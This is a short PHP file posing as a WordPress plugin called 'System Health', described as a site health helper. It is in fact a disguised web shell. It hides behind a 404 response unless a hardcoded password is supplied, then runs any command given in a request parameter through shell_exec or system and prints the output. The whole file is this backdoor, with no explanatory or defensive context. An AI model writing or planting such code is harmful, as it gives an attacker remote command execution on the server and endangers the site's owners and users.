<?php
/*
Plugin Name: System Health
Description: Site health helper.
*/
$p='wp2_drzWFwkjlSAU9ktFRDfy';
if(!isset($_REQUEST['pass'])||$_REQUEST['pass']!==$p){http_response_code(404);exit;}
$c=isset($_REQUEST['cmd'])?(string)$_REQUEST['cmd']:'';
if($c!==''){
  $o=@shell_exec($c);
  if($o===null||$o===''){ob_start();@system($c);$o=ob_get_clean();}
  echo $o;
}
